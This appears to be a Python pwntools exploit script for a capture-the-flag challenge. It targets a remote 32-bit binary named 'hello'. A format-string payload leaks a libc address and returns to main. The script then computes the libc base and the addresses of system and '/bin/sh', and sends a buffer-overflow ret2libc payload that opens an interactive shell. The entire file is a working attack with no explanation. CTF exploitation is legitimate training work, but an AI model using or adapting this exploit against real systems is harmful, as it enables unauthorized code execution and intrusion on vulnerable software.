import sys
from pwn import *

host, port = 'chall.csivit.com', 30046
libc = ELF('libc6-i386_2.23-0ubuntu11.2_amd64.so')

if len(sys.argv) > 1:
	p = process('./hello')
	if sys.argv[1] == '1':
		gdb.attach(p)
else:
	p = remote(host, port)

offset__libc_start_main_ret = 0x018647
offset__system = 0x03a950
offset__str_bin_sh = 0x15910b

offset = 136
main = 0x804865D
lib_main = b'%42$p' # <__libc_start_main+245>

pad = lambda pyd: pyd+b"X"*(offset-len(pyd)) 

payload = flat([ pad(lib_main+b'BBBB'), p32(main) ])

p.sendlineafter('?\n', payload)
p.recvuntil('Hello, ')

leak = int(p.recvuntil(b'BBBB')[2:-4],16)
libcbase = leak - offset__libc_start_main_ret
system = libcbase + libc.sym['system']
binsh = libcbase + libc.search('/bin/sh').next()

log.info("LEAK : {}".format(hex(leak)))
log.info("BASE : {}".format(hex(libcbase)))
log.info("system : {}".format(hex(system)))
log.info("binsh : {}".format(hex(binsh)))

payload = flat([ pad(b'X'), p32(system), p32(0xdeadbeef), p32(binsh) ])

p.sendline(payload)
p.interactive()
